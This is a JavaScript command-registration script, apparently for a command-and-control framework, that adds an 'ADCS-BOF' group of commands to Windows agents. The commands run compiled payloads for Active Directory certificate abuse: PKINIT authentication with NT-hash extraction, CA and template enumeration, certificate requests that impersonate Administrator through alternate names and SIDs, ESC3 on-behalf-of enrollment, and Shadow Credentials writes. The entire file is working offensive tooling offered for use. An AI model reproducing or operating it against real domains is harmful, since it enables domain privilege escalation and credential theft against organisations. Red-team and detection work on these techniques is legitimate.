
let _cmd_certi_auth = ax.create_command("auth", "Authenticate with certificate (PKINIT + UnPAC-the-hash)", "certi auth --cert MIIMcAIBAzCCDCwG....");
_cmd_certi_auth.addArgFlagString("--cert", "cert", "Base64 encoded PFX certificate", "");
_cmd_certi_auth.addArgFlagFile("--pfx", "pfx", false, "PFX certificate file");
_cmd_certi_auth.addArgFlagString("--password", "password", "PFX password", "");
_cmd_certi_auth.addArgFlagString("--dc", "dc", "Domain Controller address (auto-detected if not specified)", "");
_cmd_certi_auth.addArgBool("--no-unpac", "Only get TGT, don't extract NT hash");
_cmd_certi_auth.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let cert = parsed_json["cert"];
    let pfx = parsed_json["pfx"];
    let password = parsed_json["password"];
    let dc = parsed_json["dc"];
    let no_unpac = parsed_json["--no-unpac"] ? 1 : 0;

    if (!cert && !pfx) { throw new Error("Either --cert or --pfx must be specified"); }

    let bof_params = ax.bof_pack("cstr,cstr,cstr,bytes,short", [cert || "", password, dc, pfx || "", no_unpac]);
    let bof_path = ax.script_dir() + "_bin/ADCS/certi_auth." + ax.arch(id) + ".o";
    let message = "Task: Authenticate with certificate (PKINIT)";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



var _cmd_certi_enum = ax.create_command("enum", "Enumerate CAs and templates in the AD", "certi enum");
_cmd_certi_enum.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {

    let bof_path = ax.script_dir() + "_bin/ADCS/certi_enum." + ax.arch(id) + ".o";
    let message = "Task: Enumerate CAs and templates";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path}`, message );
});



var _cmd_certi_req = ax.create_command("request", "Request an enrollment certificate", "certi req --ca cert.example.org\\example-CERT-CA --template vulnTemplate --subject CN=Administrator,CN=Users,DC=example,DC=org --altname CN=second_adm,CN=Users,DC=example,DC=org --alturl tag:microsoft.com,2022-09-14:sid:S-1-5-21-3006160104-3291460162-27467737-1123");
_cmd_certi_req.addArgFlagString( "--ca",      "CA",       true, "The certificate authority to use");
_cmd_certi_req.addArgFlagString("--template", "template",       "The certificate type to request (else default for User/Machine)", "");
_cmd_certi_req.addArgFlagString("--subject",  "subject",        "The subject's distinguished name (else default for user/machine)", "");
_cmd_certi_req.addArgFlagString("--altname",  "altname",        "The alternate subject's distinguished name", "");
_cmd_certi_req.addArgFlagString("--alturl",   "alturl",         "SAN URL entry, can be used to specify the alternate subject's SID", "");
_cmd_certi_req.addArgFlagString("--pfx-password",   "password", "PFX certificate password", "");
_cmd_certi_req.addArgBool("--install", "Install the certificate in current context?");
_cmd_certi_req.addArgBool("--machine", "Request a certificate for a machine instead of a user?");
_cmd_certi_req.addArgBool("--policy",  "Adds App policy to allow client auth and Acting as a certificate agent (for ESC15)");
_cmd_certi_req.addArgBool("--dns",     "Subject Altname given as a DNS name (else: Subject alt name given as UPN)");
_cmd_certi_req.addArgBool("--pem", "Output in PEM format instead of PFX");
_cmd_certi_req.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {

    let ca       = "";
    let template = parsed_json["template"];
    let subject  = parsed_json["subject"];
    let altname  = parsed_json["altname"];
    let alturl   = parsed_json["alturl"];
    let password = parsed_json["password"];
    let install = 0;
    let machine = 0;
    let policy  = 0;
    let dns     = 0;
    let pem = 0;

    if("CA" in parsed_json) {
        ca = parsed_json["CA"];
    } else {
        throw new Error("Need to provide the Certificate Authority at a minimum");
    }

    if(parsed_json["--install"]) { install = 1; }
    if(parsed_json["--machine"]) { machine = 1; }
    if(parsed_json["--policy"]) { policy = 1; }
    if(parsed_json["--dns"]) { dns = 1; }
    if(parsed_json["--pem"]) { pem = 1; }

    let bof_params = ax.bof_pack("wstr,wstr,wstr,wstr,wstr,wstr,short,short,short,short,short", [ca, template, subject, altname, alturl, password, install, machine, policy, dns, pem ]);
    let bof_path = ax.script_dir() + "_bin/ADCS/certi_req." + ax.arch(id) + ".o";
    let message = "Task: Request certificate";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



let _cmd_certi_req_onbehalf = ax.create_command("request_on_behalf", "Request certificate on behalf of another user (ESC3)", "certi request_on_behalf cert.example.org\\example-CERT-CA vulnTemplate Administrator /tmp/ea.pfx");
_cmd_certi_req_onbehalf.addArgFlagString( "--ca",      "ca",       true, "The certificate authority to use");
_cmd_certi_req_onbehalf.addArgFlagString("--template", "template", true, "Certificate template name");
_cmd_certi_req_onbehalf.addArgFlagString("--target",   "target",   true, "Target user (DOMAIN\\username)");
_cmd_certi_req_onbehalf.addArgFlagFile("--ea-pfx",     "ea-pfx",  true, "Enrollment Agent certificate (PFX file)");
_cmd_certi_req_onbehalf.addArgFlagString("--ea-password", "ea_password", "Enrollment Agent PFX password", "");
_cmd_certi_req_onbehalf.addArgFlagString("--pfx-password", "pfx_password", "Output PFX password", "");
_cmd_certi_req_onbehalf.addArgBool("--pem", "Output in PEM format instead of PFX");
_cmd_certi_req_onbehalf.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let ca = parsed_json["ca"];
    let template = parsed_json["template"];
    let target = parsed_json["target"];
    let ea_cert = parsed_json["ea-pfx"];
    let ea_password = parsed_json["ea_password"];
    let pfx_password = parsed_json["pfx_password"];
    let pem = 0;
    if(parsed_json["--pem"]) { pem = 1; }

    let bof_params = ax.bof_pack("wstr,wstr,wstr,wstr,wstr,bytes,short", [ca, template, target, ea_password, pfx_password, ea_cert, pem]);
    let bof_path = ax.script_dir() + "_bin/ADCS/certi_req_onbehalf." + ax.arch(id) + ".o";
    let message = "Task: Request certificate on behalf of " + target;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



let _cmd_certi_shadow = ax.create_command("shadow", "Shadow Credentials attack - write KeyCredentialLink and get certificate", "certi shadow --target Administrator");
_cmd_certi_shadow.addArgFlagString("--target", "target", true, "Target user (sAMAccountName)");
_cmd_certi_shadow.addArgFlagString("--domain", "domain", "Domain name (auto-detected if not specified)", "");
_cmd_certi_shadow.addArgBool("--no-write", "Don't write to AD, just generate certificate");
_cmd_certi_shadow.addArgBool("--clear", "Clear msDS-KeyCredentialLink (don't write new, only clear)");
_cmd_certi_shadow.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let target = parsed_json["target"];
    let domain = parsed_json["domain"];
    let no_write = parsed_json["--no-write"] ? 1 : 0;
    let clear = parsed_json["--clear"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,cstr,short,short", [target, domain, no_write, clear]);
    let bof_path = ax.script_dir() + "_bin/ADCS/certi_shadow." + ax.arch(id) + ".o";
    let message = clear ? "Task: Clear Shadow Credentials from " + target + "@" + domain 
                        : "Task: Shadow Credentials attack on " + target + "@" + domain;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});




var cmd_certi = ax.create_command("certi", "ADCS BOF");
cmd_certi.addSubCommands([ _cmd_certi_auth, _cmd_certi_enum, _cmd_certi_req, _cmd_certi_req_onbehalf, _cmd_certi_shadow ]);

var group_adcs = ax.create_commands_group("ADCS-BOF", [cmd_certi]);
ax.register_commands_group(group_adcs, ["beacon", "gopher", "kharon"], ["windows"], []);